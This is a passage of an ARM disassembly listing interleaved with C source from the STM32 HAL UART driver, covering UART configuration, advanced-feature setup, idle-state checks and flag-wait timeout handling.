 80059ac:	69bb      	ldr	r3, [r7, #24]
 80059ae:	2b0f      	cmp	r3, #15
 80059b0:	d909      	bls.n	80059c6 <UART_SetConfig+0x432>
 80059b2:	69bb      	ldr	r3, [r7, #24]
 80059b4:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 80059b8:	d205      	bcs.n	80059c6 <UART_SetConfig+0x432>
      {
        huart->Instance->BRR = (uint16_t)usartdiv;
 80059ba:	69bb      	ldr	r3, [r7, #24]
 80059bc:	b29a      	uxth	r2, r3
 80059be:	68fb      	ldr	r3, [r7, #12]
 80059c0:	681b      	ldr	r3, [r3, #0]
 80059c2:	60da      	str	r2, [r3, #12]
 80059c4:	e002      	b.n	80059cc <UART_SetConfig+0x438>
      }
      else
      {
        ret = HAL_ERROR;
 80059c6:	2301      	movs	r3, #1
 80059c8:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
  huart->NbTxDataToProcess = 1;
  huart->NbRxDataToProcess = 1;
#endif /* USART_CR1_FIFOEN */

  /* Clear ISR function pointers */
  huart->RxISR = NULL;
 80059cc:	68fb      	ldr	r3, [r7, #12]
 80059ce:	2200      	movs	r2, #0
 80059d0:	669a      	str	r2, [r3, #104]	; 0x68
  huart->TxISR = NULL;
 80059d2:	68fb      	ldr	r3, [r7, #12]
 80059d4:	2200      	movs	r2, #0
 80059d6:	66da      	str	r2, [r3, #108]	; 0x6c

  return ret;
 80059d8:	f897 3022 	ldrb.w	r3, [r7, #34]	; 0x22
}
 80059dc:	4618      	mov	r0, r3
 80059de:	3728      	adds	r7, #40	; 0x28
 80059e0:	46bd      	mov	sp, r7
 80059e2:	e8bd 8fb0 	ldmia.w	sp!, {r4, r5, r7, r8, r9, sl, fp, pc}
 80059e6:	bf00      	nop
 80059e8:	00f42400 	.word	0x00f42400

080059ec <UART_AdvFeatureConfig>:
  * @brief Configure the UART peripheral advanced features.
  * @param huart UART handle.
  * @retval None
  */
void UART_AdvFeatureConfig(UART_HandleTypeDef *huart)
{
 80059ec:	b480      	push	{r7}
 80059ee:	b083      	sub	sp, #12
 80059f0:	af00      	add	r7, sp, #0
 80059f2:	6078      	str	r0, [r7, #4]
  /* Check whether the set of advanced features to configure is properly set */
  assert_param(IS_UART_ADVFEATURE_INIT(huart->AdvancedInit.AdvFeatureInit));

  /* if required, configure RX/TX pins swap */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_SWAP_INIT))
 80059f4:	687b      	ldr	r3, [r7, #4]
 80059f6:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 80059f8:	f003 0308 	and.w	r3, r3, #8
 80059fc:	2b00      	cmp	r3, #0
 80059fe:	d00a      	beq.n	8005a16 <UART_AdvFeatureConfig+0x2a>
  {
    assert_param(IS_UART_ADVFEATURE_SWAP(huart->AdvancedInit.Swap));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_SWAP, huart->AdvancedInit.Swap);
 8005a00:	687b      	ldr	r3, [r7, #4]
 8005a02:	681b      	ldr	r3, [r3, #0]
 8005a04:	685b      	ldr	r3, [r3, #4]
 8005a06:	f423 4100 	bic.w	r1, r3, #32768	; 0x8000
 8005a0a:	687b      	ldr	r3, [r7, #4]
 8005a0c:	6b5a      	ldr	r2, [r3, #52]	; 0x34
 8005a0e:	687b      	ldr	r3, [r7, #4]
 8005a10:	681b      	ldr	r3, [r3, #0]
 8005a12:	430a      	orrs	r2, r1
 8005a14:	605a      	str	r2, [r3, #4]
  }

  /* if required, configure TX pin active level inversion */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_TXINVERT_INIT))
 8005a16:	687b      	ldr	r3, [r7, #4]
 8005a18:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005a1a:	f003 0301 	and.w	r3, r3, #1
 8005a1e:	2b00      	cmp	r3, #0
 8005a20:	d00a      	beq.n	8005a38 <UART_AdvFeatureConfig+0x4c>
  {
    assert_param(IS_UART_ADVFEATURE_TXINV(huart->AdvancedInit.TxPinLevelInvert));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_TXINV, huart->AdvancedInit.TxPinLevelInvert);
 8005a22:	687b      	ldr	r3, [r7, #4]
 8005a24:	681b      	ldr	r3, [r3, #0]
 8005a26:	685b      	ldr	r3, [r3, #4]
 8005a28:	f423 3100 	bic.w	r1, r3, #131072	; 0x20000
 8005a2c:	687b      	ldr	r3, [r7, #4]
 8005a2e:	6a9a      	ldr	r2, [r3, #40]	; 0x28
 8005a30:	687b      	ldr	r3, [r7, #4]
 8005a32:	681b      	ldr	r3, [r3, #0]
 8005a34:	430a      	orrs	r2, r1
 8005a36:	605a      	str	r2, [r3, #4]
  }

  /* if required, configure RX pin active level inversion */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_RXINVERT_INIT))
 8005a38:	687b      	ldr	r3, [r7, #4]
 8005a3a:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005a3c:	f003 0302 	and.w	r3, r3, #2
 8005a40:	2b00      	cmp	r3, #0
 8005a42:	d00a      	beq.n	8005a5a <UART_AdvFeatureConfig+0x6e>
  {
    assert_param(IS_UART_ADVFEATURE_RXINV(huart->AdvancedInit.RxPinLevelInvert));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_RXINV, huart->AdvancedInit.RxPinLevelInvert);
 8005a44:	687b      	ldr	r3, [r7, #4]
 8005a46:	681b      	ldr	r3, [r3, #0]
 8005a48:	685b      	ldr	r3, [r3, #4]
 8005a4a:	f423 3180 	bic.w	r1, r3, #65536	; 0x10000
 8005a4e:	687b      	ldr	r3, [r7, #4]
 8005a50:	6ada      	ldr	r2, [r3, #44]	; 0x2c
 8005a52:	687b      	ldr	r3, [r7, #4]
 8005a54:	681b      	ldr	r3, [r3, #0]
 8005a56:	430a      	orrs	r2, r1
 8005a58:	605a      	str	r2, [r3, #4]
  }

  /* if required, configure data inversion */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_DATAINVERT_INIT))
 8005a5a:	687b      	ldr	r3, [r7, #4]
 8005a5c:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005a5e:	f003 0304 	and.w	r3, r3, #4
 8005a62:	2b00      	cmp	r3, #0
 8005a64:	d00a      	beq.n	8005a7c <UART_AdvFeatureConfig+0x90>
  {
    assert_param(IS_UART_ADVFEATURE_DATAINV(huart->AdvancedInit.DataInvert));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_DATAINV, huart->AdvancedInit.DataInvert);
 8005a66:	687b      	ldr	r3, [r7, #4]
 8005a68:	681b      	ldr	r3, [r3, #0]
 8005a6a:	685b      	ldr	r3, [r3, #4]
 8005a6c:	f423 2180 	bic.w	r1, r3, #262144	; 0x40000
 8005a70:	687b      	ldr	r3, [r7, #4]
 8005a72:	6b1a      	ldr	r2, [r3, #48]	; 0x30
 8005a74:	687b      	ldr	r3, [r7, #4]
 8005a76:	681b      	ldr	r3, [r3, #0]
 8005a78:	430a      	orrs	r2, r1
 8005a7a:	605a      	str	r2, [r3, #4]
  }

  /* if required, configure RX overrun detection disabling */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_RXOVERRUNDISABLE_INIT))
 8005a7c:	687b      	ldr	r3, [r7, #4]
 8005a7e:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005a80:	f003 0310 	and.w	r3, r3, #16
 8005a84:	2b00      	cmp	r3, #0
 8005a86:	d00a      	beq.n	8005a9e <UART_AdvFeatureConfig+0xb2>
  {
    assert_param(IS_UART_OVERRUN(huart->AdvancedInit.OverrunDisable));
    MODIFY_REG(huart->Instance->CR3, USART_CR3_OVRDIS, huart->AdvancedInit.OverrunDisable);
 8005a88:	687b      	ldr	r3, [r7, #4]
 8005a8a:	681b      	ldr	r3, [r3, #0]
 8005a8c:	689b      	ldr	r3, [r3, #8]
 8005a8e:	f423 5180 	bic.w	r1, r3, #4096	; 0x1000
 8005a92:	687b      	ldr	r3, [r7, #4]
 8005a94:	6b9a      	ldr	r2, [r3, #56]	; 0x38
 8005a96:	687b      	ldr	r3, [r7, #4]
 8005a98:	681b      	ldr	r3, [r3, #0]
 8005a9a:	430a      	orrs	r2, r1
 8005a9c:	609a      	str	r2, [r3, #8]
  }

  /* if required, configure DMA disabling on reception error */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_DMADISABLEONERROR_INIT))
 8005a9e:	687b      	ldr	r3, [r7, #4]
 8005aa0:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005aa2:	f003 0320 	and.w	r3, r3, #32
 8005aa6:	2b00      	cmp	r3, #0
 8005aa8:	d00a      	beq.n	8005ac0 <UART_AdvFeatureConfig+0xd4>
  {
    assert_param(IS_UART_ADVFEATURE_DMAONRXERROR(huart->AdvancedInit.DMADisableonRxError));
    MODIFY_REG(huart->Instance->CR3, USART_CR3_DDRE, huart->AdvancedInit.DMADisableonRxError);
 8005aaa:	687b      	ldr	r3, [r7, #4]
 8005aac:	681b      	ldr	r3, [r3, #0]
 8005aae:	689b      	ldr	r3, [r3, #8]
 8005ab0:	f423 5100 	bic.w	r1, r3, #8192	; 0x2000
 8005ab4:	687b      	ldr	r3, [r7, #4]
 8005ab6:	6bda      	ldr	r2, [r3, #60]	; 0x3c
 8005ab8:	687b      	ldr	r3, [r7, #4]
 8005aba:	681b      	ldr	r3, [r3, #0]
 8005abc:	430a      	orrs	r2, r1
 8005abe:	609a      	str	r2, [r3, #8]
  }

  /* if required, configure auto Baud rate detection scheme */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_AUTOBAUDRATE_INIT))
 8005ac0:	687b      	ldr	r3, [r7, #4]
 8005ac2:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005ac4:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8005ac8:	2b00      	cmp	r3, #0
 8005aca:	d01a      	beq.n	8005b02 <UART_AdvFeatureConfig+0x116>
  {
    assert_param(IS_USART_AUTOBAUDRATE_DETECTION_INSTANCE(huart->Instance));
    assert_param(IS_UART_ADVFEATURE_AUTOBAUDRATE(huart->AdvancedInit.AutoBaudRateEnable));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_ABREN, huart->AdvancedInit.AutoBaudRateEnable);
 8005acc:	687b      	ldr	r3, [r7, #4]
 8005ace:	681b      	ldr	r3, [r3, #0]
 8005ad0:	685b      	ldr	r3, [r3, #4]
 8005ad2:	f423 1180 	bic.w	r1, r3, #1048576	; 0x100000
 8005ad6:	687b      	ldr	r3, [r7, #4]
 8005ad8:	6c1a      	ldr	r2, [r3, #64]	; 0x40
 8005ada:	687b      	ldr	r3, [r7, #4]
 8005adc:	681b      	ldr	r3, [r3, #0]
 8005ade:	430a      	orrs	r2, r1
 8005ae0:	605a      	str	r2, [r3, #4]
    /* set auto Baudrate detection parameters if detection is enabled */
    if (huart->AdvancedInit.AutoBaudRateEnable == UART_ADVFEATURE_AUTOBAUDRATE_ENABLE)
 8005ae2:	687b      	ldr	r3, [r7, #4]
 8005ae4:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 8005ae6:	f5b3 1f80 	cmp.w	r3, #1048576	; 0x100000
 8005aea:	d10a      	bne.n	8005b02 <UART_AdvFeatureConfig+0x116>
    {
      assert_param(IS_UART_ADVFEATURE_AUTOBAUDRATEMODE(huart->AdvancedInit.AutoBaudRateMode));
      MODIFY_REG(huart->Instance->CR2, USART_CR2_ABRMODE, huart->AdvancedInit.AutoBaudRateMode);
 8005aec:	687b      	ldr	r3, [r7, #4]
 8005aee:	681b      	ldr	r3, [r3, #0]
 8005af0:	685b      	ldr	r3, [r3, #4]
 8005af2:	f423 01c0 	bic.w	r1, r3, #6291456	; 0x600000
 8005af6:	687b      	ldr	r3, [r7, #4]
 8005af8:	6c5a      	ldr	r2, [r3, #68]	; 0x44
 8005afa:	687b      	ldr	r3, [r7, #4]
 8005afc:	681b      	ldr	r3, [r3, #0]
 8005afe:	430a      	orrs	r2, r1
 8005b00:	605a      	str	r2, [r3, #4]
    }
  }

  /* if required, configure MSB first on communication line */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_MSBFIRST_INIT))
 8005b02:	687b      	ldr	r3, [r7, #4]
 8005b04:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005b06:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8005b0a:	2b00      	cmp	r3, #0
 8005b0c:	d00a      	beq.n	8005b24 <UART_AdvFeatureConfig+0x138>
  {
    assert_param(IS_UART_ADVFEATURE_MSBFIRST(huart->AdvancedInit.MSBFirst));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_MSBFIRST, huart->AdvancedInit.MSBFirst);
 8005b0e:	687b      	ldr	r3, [r7, #4]
 8005b10:	681b      	ldr	r3, [r3, #0]
 8005b12:	685b      	ldr	r3, [r3, #4]
 8005b14:	f423 2100 	bic.w	r1, r3, #524288	; 0x80000
 8005b18:	687b      	ldr	r3, [r7, #4]
 8005b1a:	6c9a      	ldr	r2, [r3, #72]	; 0x48
 8005b1c:	687b      	ldr	r3, [r7, #4]
 8005b1e:	681b      	ldr	r3, [r3, #0]
 8005b20:	430a      	orrs	r2, r1
 8005b22:	605a      	str	r2, [r3, #4]
  }
}
 8005b24:	bf00      	nop
 8005b26:	370c      	adds	r7, #12
 8005b28:	46bd      	mov	sp, r7
 8005b2a:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005b2e:	4770      	bx	lr

08005b30 <UART_CheckIdleState>:
  * @brief Check the UART Idle State.
  * @param huart UART handle.
  * @retval HAL status
  */
HAL_StatusTypeDef UART_CheckIdleState(UART_HandleTypeDef *huart)
{
 8005b30:	b580      	push	{r7, lr}
 8005b32:	b098      	sub	sp, #96	; 0x60
 8005b34:	af02      	add	r7, sp, #8
 8005b36:	6078      	str	r0, [r7, #4]
  uint32_t tickstart;

  /* Initialize the UART ErrorCode */
  huart->ErrorCode = HAL_UART_ERROR_NONE;
 8005b38:	687b      	ldr	r3, [r7, #4]
 8005b3a:	2200      	movs	r2, #0
 8005b3c:	f8c3 2084 	str.w	r2, [r3, #132]	; 0x84

  /* Init tickstart for timeout management */
  tickstart = HAL_GetTick();
 8005b40:	f7fb fb62 	bl	8001208 <HAL_GetTick>
 8005b44:	6578      	str	r0, [r7, #84]	; 0x54

  /* Check if the Transmitter is enabled */
  if ((huart->Instance->CR1 & USART_CR1_TE) == USART_CR1_TE)
 8005b46:	687b      	ldr	r3, [r7, #4]
 8005b48:	681b      	ldr	r3, [r3, #0]
 8005b4a:	681b      	ldr	r3, [r3, #0]
 8005b4c:	f003 0308 	and.w	r3, r3, #8
 8005b50:	2b08      	cmp	r3, #8
 8005b52:	d12e      	bne.n	8005bb2 <UART_CheckIdleState+0x82>
  {
    /* Wait until TEACK flag is set */
    if (UART_WaitOnFlagUntilTimeout(huart, USART_ISR_TEACK, RESET, tickstart, HAL_UART_TIMEOUT_VALUE) != HAL_OK)
 8005b54:	f06f 437e 	mvn.w	r3, #4261412864	; 0xfe000000
 8005b58:	9300      	str	r3, [sp, #0]
 8005b5a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8005b5c:	2200      	movs	r2, #0
 8005b5e:	f44f 1100 	mov.w	r1, #2097152	; 0x200000
 8005b62:	6878      	ldr	r0, [r7, #4]
 8005b64:	f000 f88c 	bl	8005c80 <UART_WaitOnFlagUntilTimeout>
 8005b68:	4603      	mov	r3, r0
 8005b6a:	2b00      	cmp	r3, #0
 8005b6c:	d021      	beq.n	8005bb2 <UART_CheckIdleState+0x82>
    {
      /* Disable TXE interrupt for the interrupt process */
#if defined(USART_CR1_FIFOEN)
      ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_TXEIE_TXFNFIE));
#else
      ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_TXEIE));
 8005b6e:	687b      	ldr	r3, [r7, #4]
 8005b70:	681b      	ldr	r3, [r3, #0]
 8005b72:	63bb      	str	r3, [r7, #56]	; 0x38
 */
__STATIC_FORCEINLINE uint32_t __LDREXW(volatile uint32_t *addr)
{
    uint32_t result;

   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005b74:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8005b76:	e853 3f00 	ldrex	r3, [r3]
 8005b7a:	637b      	str	r3, [r7, #52]	; 0x34
   return(result);
 8005b7c:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8005b7e:	f023 0380 	bic.w	r3, r3, #128	; 0x80
 8005b82:	653b      	str	r3, [r7, #80]	; 0x50
 8005b84:	687b      	ldr	r3, [r7, #4]
 8005b86:	681b      	ldr	r3, [r3, #0]
 8005b88:	461a      	mov	r2, r3
 8005b8a:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 8005b8c:	647b      	str	r3, [r7, #68]	; 0x44
 8005b8e:	643a      	str	r2, [r7, #64]	; 0x40
 */
__STATIC_FORCEINLINE uint32_t __STREXW(uint32_t value, volatile uint32_t *addr)
{
   uint32_t result;

   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005b90:	6c39      	ldr	r1, [r7, #64]	; 0x40
 8005b92:	6c7a      	ldr	r2, [r7, #68]	; 0x44
 8005b94:	e841 2300 	strex	r3, r2, [r1]
 8005b98:	63fb      	str	r3, [r7, #60]	; 0x3c
   return(result);
 8005b9a:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8005b9c:	2b00      	cmp	r3, #0
 8005b9e:	d1e6      	bne.n	8005b6e <UART_CheckIdleState+0x3e>
#endif /* USART_CR1_FIFOEN */

      huart->gState = HAL_UART_STATE_READY;
 8005ba0:	687b      	ldr	r3, [r7, #4]
 8005ba2:	2220      	movs	r2, #32
 8005ba4:	67da      	str	r2, [r3, #124]	; 0x7c

      __HAL_UNLOCK(huart);
 8005ba6:	687b      	ldr	r3, [r7, #4]
 8005ba8:	2200      	movs	r2, #0
 8005baa:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

      /* Timeout occurred */
      return HAL_TIMEOUT;
 8005bae:	2303      	movs	r3, #3
 8005bb0:	e062      	b.n	8005c78 <UART_CheckIdleState+0x148>
    }
  }

  /* Check if the Receiver is enabled */
  if ((huart->Instance->CR1 & USART_CR1_RE) == USART_CR1_RE)
 8005bb2:	687b      	ldr	r3, [r7, #4]
 8005bb4:	681b      	ldr	r3, [r3, #0]
 8005bb6:	681b      	ldr	r3, [r3, #0]
 8005bb8:	f003 0304 	and.w	r3, r3, #4
 8005bbc:	2b04      	cmp	r3, #4
 8005bbe:	d149      	bne.n	8005c54 <UART_CheckIdleState+0x124>
  {
    /* Wait until REACK flag is set */
    if (UART_WaitOnFlagUntilTimeout(huart, USART_ISR_REACK, RESET, tickstart, HAL_UART_TIMEOUT_VALUE) != HAL_OK)
 8005bc0:	f06f 437e 	mvn.w	r3, #4261412864	; 0xfe000000
 8005bc4:	9300      	str	r3, [sp, #0]
 8005bc6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8005bc8:	2200      	movs	r2, #0
 8005bca:	f44f 0180 	mov.w	r1, #4194304	; 0x400000
 8005bce:	6878      	ldr	r0, [r7, #4]
 8005bd0:	f000 f856 	bl	8005c80 <UART_WaitOnFlagUntilTimeout>
 8005bd4:	4603      	mov	r3, r0
 8005bd6:	2b00      	cmp	r3, #0
 8005bd8:	d03c      	beq.n	8005c54 <UART_CheckIdleState+0x124>
      /* Disable RXNE, PE and ERR (Frame error, noise error, overrun error)
      interrupts for the interrupt process */
#if defined(USART_CR1_FIFOEN)
      ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE_RXFNEIE | USART_CR1_PEIE));
#else
      ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE | USART_CR1_PEIE));
 8005bda:	687b      	ldr	r3, [r7, #4]
 8005bdc:	681b      	ldr	r3, [r3, #0]
 8005bde:	627b      	str	r3, [r7, #36]	; 0x24
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005be0:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8005be2:	e853 3f00 	ldrex	r3, [r3]
 8005be6:	623b      	str	r3, [r7, #32]
   return(result);
 8005be8:	6a3b      	ldr	r3, [r7, #32]
 8005bea:	f423 7390 	bic.w	r3, r3, #288	; 0x120
 8005bee:	64fb      	str	r3, [r7, #76]	; 0x4c
 8005bf0:	687b      	ldr	r3, [r7, #4]
 8005bf2:	681b      	ldr	r3, [r3, #0]
 8005bf4:	461a      	mov	r2, r3
 8005bf6:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 8005bf8:	633b      	str	r3, [r7, #48]	; 0x30
 8005bfa:	62fa      	str	r2, [r7, #44]	; 0x2c
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005bfc:	6af9      	ldr	r1, [r7, #44]	; 0x2c
 8005bfe:	6b3a      	ldr	r2, [r7, #48]	; 0x30
 8005c00:	e841 2300 	strex	r3, r2, [r1]
 8005c04:	62bb      	str	r3, [r7, #40]	; 0x28
   return(result);
 8005c06:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8005c08:	2b00      	cmp	r3, #0
 8005c0a:	d1e6      	bne.n	8005bda <UART_CheckIdleState+0xaa>
#endif /* USART_CR1_FIFOEN */
      ATOMIC_CLEAR_BIT(huart->Instance->CR3, USART_CR3_EIE);
 8005c0c:	687b      	ldr	r3, [r7, #4]
 8005c0e:	681b      	ldr	r3, [r3, #0]
 8005c10:	3308      	adds	r3, #8
 8005c12:	613b      	str	r3, [r7, #16]
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005c14:	693b      	ldr	r3, [r7, #16]
 8005c16:	e853 3f00 	ldrex	r3, [r3]
 8005c1a:	60fb      	str	r3, [r7, #12]
   return(result);
 8005c1c:	68fb      	ldr	r3, [r7, #12]
 8005c1e:	f023 0301 	bic.w	r3, r3, #1
 8005c22:	64bb      	str	r3, [r7, #72]	; 0x48
 8005c24:	687b      	ldr	r3, [r7, #4]
 8005c26:	681b      	ldr	r3, [r3, #0]
 8005c28:	3308      	adds	r3, #8
 8005c2a:	6cba      	ldr	r2, [r7, #72]	; 0x48
 8005c2c:	61fa      	str	r2, [r7, #28]
 8005c2e:	61bb      	str	r3, [r7, #24]
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005c30:	69b9      	ldr	r1, [r7, #24]
 8005c32:	69fa      	ldr	r2, [r7, #28]
 8005c34:	e841 2300 	strex	r3, r2, [r1]
 8005c38:	617b      	str	r3, [r7, #20]
   return(result);
 8005c3a:	697b      	ldr	r3, [r7, #20]
 8005c3c:	2b00      	cmp	r3, #0
 8005c3e:	d1e5      	bne.n	8005c0c <UART_CheckIdleState+0xdc>

      huart->RxState = HAL_UART_STATE_READY;
 8005c40:	687b      	ldr	r3, [r7, #4]
 8005c42:	2220      	movs	r2, #32
 8005c44:	f8c3 2080 	str.w	r2, [r3, #128]	; 0x80

      __HAL_UNLOCK(huart);
 8005c48:	687b      	ldr	r3, [r7, #4]
 8005c4a:	2200      	movs	r2, #0
 8005c4c:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

      /* Timeout occurred */
      return HAL_TIMEOUT;
 8005c50:	2303      	movs	r3, #3
 8005c52:	e011      	b.n	8005c78 <UART_CheckIdleState+0x148>
    }
  }

  /* Initialize the UART State */
  huart->gState = HAL_UART_STATE_READY;
 8005c54:	687b      	ldr	r3, [r7, #4]
 8005c56:	2220      	movs	r2, #32
 8005c58:	67da      	str	r2, [r3, #124]	; 0x7c
  huart->RxState = HAL_UART_STATE_READY;
 8005c5a:	687b      	ldr	r3, [r7, #4]
 8005c5c:	2220      	movs	r2, #32
 8005c5e:	f8c3 2080 	str.w	r2, [r3, #128]	; 0x80
  huart->ReceptionType = HAL_UART_RECEPTION_STANDARD;
 8005c62:	687b      	ldr	r3, [r7, #4]
 8005c64:	2200      	movs	r2, #0
 8005c66:	661a      	str	r2, [r3, #96]	; 0x60
  huart->RxEventType = HAL_UART_RXEVENT_TC;
 8005c68:	687b      	ldr	r3, [r7, #4]
 8005c6a:	2200      	movs	r2, #0
 8005c6c:	665a      	str	r2, [r3, #100]	; 0x64

  __HAL_UNLOCK(huart);
 8005c6e:	687b      	ldr	r3, [r7, #4]
 8005c70:	2200      	movs	r2, #0
 8005c72:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

  return HAL_OK;
 8005c76:	2300      	movs	r3, #0
}
 8005c78:	4618      	mov	r0, r3
 8005c7a:	3758      	adds	r7, #88	; 0x58
 8005c7c:	46bd      	mov	sp, r7
 8005c7e:	bd80      	pop	{r7, pc}

08005c80 <UART_WaitOnFlagUntilTimeout>:
  * @param Timeout   Timeout duration
  * @retval HAL status
  */
HAL_StatusTypeDef UART_WaitOnFlagUntilTimeout(UART_HandleTypeDef *huart, uint32_t Flag, FlagStatus Status,
                                              uint32_t Tickstart, uint32_t Timeout)
{
 8005c80:	b580      	push	{r7, lr}
 8005c82:	b084      	sub	sp, #16
 8005c84:	af00      	add	r7, sp, #0
 8005c86:	60f8      	str	r0, [r7, #12]
 8005c88:	60b9      	str	r1, [r7, #8]
 8005c8a:	603b      	str	r3, [r7, #0]
 8005c8c:	4613      	mov	r3, r2
 8005c8e:	71fb      	strb	r3, [r7, #7]
  /* Wait until flag is set */
  while ((__HAL_UART_GET_FLAG(huart, Flag) ? SET : RESET) == Status)
 8005c90:	e049      	b.n	8005d26 <UART_WaitOnFlagUntilTimeout+0xa6>
  {
    /* Check for the Timeout */
    if (Timeout != HAL_MAX_DELAY)
 8005c92:	69bb      	ldr	r3, [r7, #24]
 8005c94:	f1b3 3fff 	cmp.w	r3, #4294967295
 8005c98:	d045      	beq.n	8005d26 <UART_WaitOnFlagUntilTimeout+0xa6>
    {
      if (((HAL_GetTick() - Tickstart) > Timeout) || (Timeout == 0U))
 8005c9a:	f7fb fab5 	bl	8001208 <HAL_GetTick>
 8005c9e:	4602      	mov	r2, r0
 8005ca0:	683b      	ldr	r3, [r7, #0]
 8005ca2:	1ad3      	subs	r3, r2, r3
 8005ca4:	69ba      	ldr	r2, [r7, #24]
 8005ca6:	429a      	cmp	r2, r3
 8005ca8:	d302      	bcc.n	8005cb0 <UART_WaitOnFlagUntilTimeout+0x30>
 8005caa:	69bb      	ldr	r3, [r7, #24]
 8005cac:	2b00      	cmp	r3, #0
 8005cae:	d101      	bne.n	8005cb4 <UART_WaitOnFlagUntilTimeout+0x34>
      {

        return HAL_TIMEOUT;
 8005cb0:	2303      	movs	r3, #3
 8005cb2:	e048      	b.n	8005d46 <UART_WaitOnFlagUntilTimeout+0xc6>
      }

      if (READ_BIT(huart->Instance->CR1, USART_CR1_RE) != 0U)
 8005cb4:	68fb      	ldr	r3, [r7, #12]
 8005cb6:	681b      	ldr	r3, [r3, #0]
 8005cb8:	681b      	ldr	r3, [r3, #0]
 8005cba:	f003 0304 	and.w	r3, r3, #4
 8005cbe:	2b00      	cmp	r3, #0
 8005cc0:	d031      	beq.n	8005d26 <UART_WaitOnFlagUntilTimeout+0xa6>
      {
        if (__HAL_UART_GET_FLAG(huart, UART_FLAG_ORE) == SET)
 8005cc2:	68fb      	ldr	r3, [r7, #12]
 8005cc4:	681b      	ldr	r3, [r3, #0]
 8005cc6:	69db      	ldr	r3, [r3, #28]
 8005cc8:	f003 0308 	and.w	r3, r3, #8
 8005ccc:	2b08      	cmp	r3, #8
 8005cce:	d110      	bne.n	8005cf2 <UART_WaitOnFlagUntilTimeout+0x72>
        {
          /* Clear Overrun Error flag*/
          __HAL_UART_CLEAR_FLAG(huart, UART_CLEAR_OREF);
 8005cd0:	68fb      	ldr	r3, [r7, #12]
 8005cd2:	681b      	ldr	r3, [r3, #0]
 8005cd4:	2208      	movs	r2, #8
 8005cd6:	621a      	str	r2, [r3, #32]

          /* Blocking error : transfer is aborted
          Set the UART state ready to be able to start again the process,
          Disable Rx Interrupts if ongoing */
          UART_EndRxTransfer(huart);
 8005cd8:	68f8      	ldr	r0, [r7, #12]
 8005cda:	f000 f838 	bl	8005d4e <UART_EndRxTransfer>

          huart->ErrorCode = HAL_UART_ERROR_ORE;
 8005cde:	68fb      	ldr	r3, [r7, #12]
 8005ce0:	2208      	movs	r2, #8
 8005ce2:	f8c3 2084 	str.w	r2, [r3, #132]	; 0x84

          /* Process Unlocked */
          __HAL_UNLOCK(huart);
 8005ce6:	68fb      	ldr	r3, [r7, #12]
 8005ce8:	2200      	movs	r2, #0
 8005cea:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

          return HAL_ERROR;
 8005cee:	2301      	movs	r3, #1
 8005cf0:	e029      	b.n	8005d46 <UART_WaitOnFlagUntilTimeout+0xc6>
        }
        if (__HAL_UART_GET_FLAG(huart, UART_FLAG_RTOF) == SET)
 8005cf2:	68fb      	ldr	r3, [r7, #12]
 8005cf4:	681b      	ldr	r3, [r3, #0]
 8005cf6:	69db      	ldr	r3, [r3, #28]
 8005cf8:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 8005cfc:	f5b3 6f00 	cmp.w	r3, #2048	; 0x800
 8005d00:	d111      	bne.n	8005d26 <UART_WaitOnFlagUntilTimeout+0xa6>
        {
          /* Clear Receiver Timeout flag*/
